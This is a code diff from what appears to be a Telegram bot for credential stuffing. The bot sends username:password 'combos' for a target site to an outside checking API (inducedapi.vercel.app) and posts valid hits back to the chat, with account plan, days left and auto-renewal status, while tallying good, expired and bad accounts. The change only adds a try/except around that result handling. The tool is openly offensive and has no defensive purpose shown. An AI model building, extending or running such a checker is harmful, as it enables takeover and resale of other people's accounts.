@@ -196,20 +196,32 @@ async def _(e):
                 re = requests.get(
                     f"https://inducedapi.vercel.app/{d}?idp={idp}")
                 ishan = Dict2Class(re.json())
-                if ishan.error:
-                    await xmr.send_message(f'🌟 Api Is Now Dead Contact Support Group\n@InducedBotsSupport\n\nMade with ❤️ @InducedBots')
-                    return
-                else:
-                    if ishan.stats == 'Sucessfull':
-                        if ishan.validity == "Expired":
-                            custom += 1
-                            await xmr.send_message(f'🌟 Hit Expired 💫\nStats: Expired\nSite: {d}\nCombo: {idp}\n\nMade with ❤️ @InducedBots')
-                        else:
-                            good += 1
-                            await xmr.send_message(f'🌟 Hit Combo 💫\nStats: Valid\nSite: {d}\nCombo: {idp}\nPlan: {ishan.plan}\nDays Left: {ishan.validity}\nRecurring: {ishan.autorenewal}\n\nMade with ❤️ @InducedBots')
-                    elif ishan.stats == "Unsucessfull":
-                        bad += 1
-                    cpm += 1
+                try:
+                    if ishan.error:
+                        await xmr.send_message(f'🌟 Api Is Now Dead Contact Support Group\n@InducedBotsSupport\n\nMade with ❤️ @InducedBots')
+                        return
+                    else:
+                        if ishan.stats == 'Sucessfull':
+                            if ishan.validity == "Expired":
+                                custom += 1
+                                await xmr.send_message(f'🌟 Hit Expired 💫\nStats: Expired\nSite: {d}\nCombo: {idp}\n\nMade with ❤️ @InducedBots')
+                            else:
+                                good += 1
+                                await xmr.send_message(f'🌟 Hit Combo 💫\nStats: Valid\nSite: {d}\nCombo: {idp}\nPlan: {ishan.plan}\nDays Left: {ishan.validity}\nRecurring: {ishan.autorenewal}\n\nMade with ❤️ @InducedBots')
+                        elif ishan.stats == "Unsucessfull":
+                            bad += 1
+                        cpm += 1
+                except:
+                        if ishan.stats == 'Sucessfull':
+                            if ishan.validity == "Expired":
+                                custom += 1
+                                await xmr.send_message(f'🌟 Hit Expired 💫\nStats: Expired\nSite: {d}\nCombo: {idp}\n\nMade with ❤️ @InducedBots')
+                            else:
+                                good += 1
+                                await xmr.send_message(f'🌟 Hit Combo 💫\nStats: Valid\nSite: {d}\nCombo: {idp}\nPlan: {ishan.plan}\nDays Left: {ishan.validity}\nRecurring: {ishan.autorenewal}\n\nMade with ❤️ @InducedBots')
+                        elif ishan.stats == "Unsucessfull":
+                            bad += 1
+                        cpm += 1
 
             await xx.edit(f"Cracking Start\n\nCPM: {cpm}\nTotal: {good+custom+bad}\nGood: {good}\nCustom: {custom}\nBad: {bad}\n\nMade with ❤️ @InducedBots")
             await xmr.send_message("All Done")
